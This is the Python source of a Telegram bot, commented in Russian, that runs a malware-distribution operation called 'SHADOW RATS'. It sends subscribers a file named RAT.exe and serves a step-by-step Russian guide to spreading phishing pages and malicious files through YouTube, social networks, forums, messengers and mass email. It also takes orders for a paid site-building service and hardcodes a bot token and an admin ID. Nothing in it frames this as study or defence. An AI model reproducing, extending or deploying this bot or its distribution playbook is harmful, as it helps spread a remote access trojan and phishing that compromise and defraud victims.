import os
import telebot
from telebot import types, apihelper

# Замените на ваш токен бота
API_TOKEN = '7138095299:AAH3YEgptfE-Me22NR6jpeZJZWiihXfbWPY'

# Замените на ID вашего канала
CHANNEL_ID = '-1002331312384'

# Замените на путь к вашему файлу RAT.exe
RAT_FILE_PATH = 'RAT.exe'

# ID администратора
ADMIN_ID = '1258446750'

bot = telebot.TeleBot(API_TOKEN)

# Состояния
STATE_NONE = 0
STATE_WAITING_FOR_HELP = 1
STATE_WAITING_FOR_SITE_DESCRIPTION = 2

# Словарь для хранения состояний пользователей
user_states = {}

# Функция для проверки, забанен ли пользователь
def is_banned(user_id):
    if os.path.exists('ban.txt'):
        with open('ban.txt', 'r') as file:
            banned_ids = file.read().splitlines()
            return str(user_id) in banned_ids
    return False

# Функция для сохранения ID и username пользователя
def save_user_info(user_id, username):
    with open('users.txt', 'a') as file:
        file.write(f"{user_id}:{username}\n")

# Функция для сохранения описания сайта
def save_site_description(user_id, description):
    with open('site_descriptions.txt', 'a') as file:
        file.write(f"{user_id}:\n{description}\n\n")

# Обработка команды /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Сохранение информации о пользователе
    save_user_info(user_id, username)
    
    # Проверка подписки на канал
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'creator', 'administrator']:
            bot.send_message(message.chat.id, "Добро пожаловать в команду SHADOW RATS.")
            with open(RAT_FILE_PATH, 'rb') as file:
                bot.send_document(message.chat.id, file)
            
            # Добавляем кнопки "Инструкция", "Помощь" и "Создание сайта"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            instruction_button = types.KeyboardButton("Инструкция")
            help_button = types.KeyboardButton("Помощь")
            create_site_button = types.KeyboardButton("Создание сайта")
            markup.add(instruction_button, help_button, create_site_button)
            bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
        else:
            send_subscription_buttons(message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, "Произошла ошибка при проверке подписки.")

# Отправка кнопок подписки
def send_subscription_buttons(chat_id):
    markup = types.InlineKeyboardMarkup()
    subscribe_button = types.InlineKeyboardButton("Подписаться", url="https://t.me/+7U6yF05xjpljODJi")
    check_button = types.InlineKeyboardButton("Проверить", callback_data="check_subscription")
    markup.add(subscribe_button, check_button)
    bot.send_message(chat_id, "Вы должны быть подписаны на канал [SHADOW RATS] (https://t.me/+7U6yF05xjpljODJi) для получения доступа.", parse_mode='Markdown', reply_markup=markup)

# Обработка колбэка проверки подписки
@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def check_subscription(call):
    user_id = call.from_user.id
    username = call.from_user.username or call.from_user.first_name
    
    # Сохранение информации о пользователе
    save_user_info(user_id, username)
    
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'creator', 'administrator']:
            bot.send_message(call.message.chat.id, "Добро пожаловать в команду SHADOW RATS.")
            with open(RAT_FILE_PATH, 'rb') as file:
                bot.send_document(call.message.chat.id, file)
            
            # Добавляем кнопки "Инструкция", "Помощь" и "Создание сайта"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            instruction_button = types.KeyboardButton("Инструкция")
            help_button = types.KeyboardButton("Помощь")
            create_site_button = types.KeyboardButton("Создание сайта")
            markup.add(instruction_button, help_button, create_site_button)
            bot.send_message(call.message.chat.id, "Выберите действие:", reply_markup=markup)
        else:
            send_subscription_buttons(call.message.chat.id)
    except Exception as e:
        bot.send_message(call.message.chat.id, "Произошла ошибка при проверке подписки.")

# Обработка команды "Инструкция"
@bot.message_handler(func=lambda message: message.text == "Инструкция")
def send_instruction(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Сохранение информации о пользователе
    save_user_info(user_id, username)
    
    instruction = (
        "Инструкция по распространению:\n\n"
        "1. YouTube:\n"
        "   - Создайте видео-обзор или учебный ролик, связанный с темой, интересующей вашу аудиторию.\n"
        "   - В описании к видео разместите ссылки на фишинговые страницы или вредоносные файлы.\n"
        "   - Используйте SEO-оптимизацию и рекламу для привлечения большего количества зрителей.\n\n"
        "2. Социальные сети:\n"
        "   - Поделитесь ссылками на фишинговые страницы или вредоносные файлы в социальных сетях.\n"
        "   - Притворитесь легитимным пользователем и делитесь контентом, чтобы привлечь внимание.\n\n"
        "3. Форумы:\n"
        "   - Разместите фишинговый контент на форумах, посвященных интересам вашей целевой аудитории.\n"
        "   - Используйте убедительный язык, чтобы побудить пользователей перейти по ссылкам, скачать и запустить файл.\n\n"
        "4. Мессенджеры:\n"
        "   - Отправляйте фишинговые сообщения через мессенджеры, такие как WhatsApp, Telegram, Viber.\n"
        "   - Используйте массовые рассылки для достижения большего охвата.\n\n"
        "5. Электронная почта:\n"
        "   - Рассылайте фишинговые письма на адреса электронной почты, собранные из открытых источников.\n"
        "   - Используйте убедительные темы и тексты, чтобы побудить пользователей открыть письмо и запустить файл."
    )
    bot.send_message(message.chat.id, instruction)

# Обработка команды "Помощь"
@bot.message_handler(func=lambda message: message.text == "Помощь")
def handle_help(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Сохранение информации о пользователе
    save_user_info(user_id, username)
    
    # Проверка, забанен ли пользователь
    if is_banned(user_id):
        return
    
    bot.send_message(message.chat.id, "Задавайте вопрос, он будет направлен в техподдержку.")
    user_states[user_id] = STATE_WAITING_FOR_HELP

# Обработка команды "Создание сайта"
@bot.message_handler(func=lambda message: message.text == "Создание сайта")
def handle_create_site(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Сохранение информации о пользователе
    save_user_info(user_id, username)
    
    # Проверка, забанен ли пользователь
    if is_banned(user_id):
        return
    
    site_description = (
        "Опишите, для чего нужен сайт, и подробно опишите, что должно быть на сайте. "
        "ВАЖНО: Отправьте это одним сообщением, иначе блокировка на 4 часа. "
        "После того как отправите сообщение, с вами свяжется наш web разработчик, "
        "время ожидания ответа от 5 минут до 48 часов. Цена будет договорная."
    )
    bot.send_message(message.chat.id, site_description)
    user_states[user_id] = STATE_WAITING_FOR_SITE_DESCRIPTION

# Обработка сообщений пользователя
@bot.message_handler(func=lambda message: True)
def handle_user_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Сохранение информации о пользователе
    save_user_info(user_id, username)
    
    # Проверка, забанен ли пользователь
    if is_banned(user_id):
        return
    
    if user_id in user_states:
        if user_states[user_id] == STATE_WAITING_FOR_HELP:
            # Пересылка сообщения администратору
            bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
            bot.send_message(message.chat.id, "Ваше сообщение отправлено в техподдержку. Ожидайте ответа.")
            user_states[user_id] = STATE_NONE
        elif user_states[user_id] == STATE_WAITING_FOR_SITE_DESCRIPTION:
            # Сохранение описания сайта
            save_site_description(user_id, message.text)
            bot.send_message(message.chat.id, "Ваше описание сайта отправлено нашему web разработчику. Ожидайте ответа.")
            user_states[user_id] = STATE_NONE

# Обработка ответа администратора
@bot.message_handler(func=lambda message: message.reply_to_message is not None and message.from_user.id == int(ADMIN_ID))
def handle_admin_reply(message):
    original_message = message.reply_to_message
    user_id = original_message.forward_from.id
    
    # Отправка ответа пользователю
    bot.send_message(user_id, message.text)

# Запуск бота
bot.polling()
